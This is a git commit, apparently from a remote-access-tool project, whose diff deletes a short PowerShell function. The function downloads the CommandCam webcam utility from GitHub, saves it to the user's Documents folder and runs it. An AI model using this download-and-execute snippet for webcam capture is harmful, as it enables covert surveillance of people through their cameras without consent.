ea0bd9852402797641aa70870c441cfe5b3e51c3
rat <112645929+iLoveRat@users.noreply.github.com>
2023-06-10 12:19:23 +0200

    bad

--- webcamimage.ps1
+++
@@ -1,9 +0,0 @@
-function webcam {
-    # loading mod
-    $url = "https://github.com/tedburke/CommandCam/raw/master/CommandCam.exe"
-    $outpath = "C:\Users\$env:username\Documents\CommandCam.exe"
-    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-    Invoke-WebRequest -Uri $url -OutFile $outpath
-    Start-Sleep -Seconds 5
-    Start-Process $outpath
-}
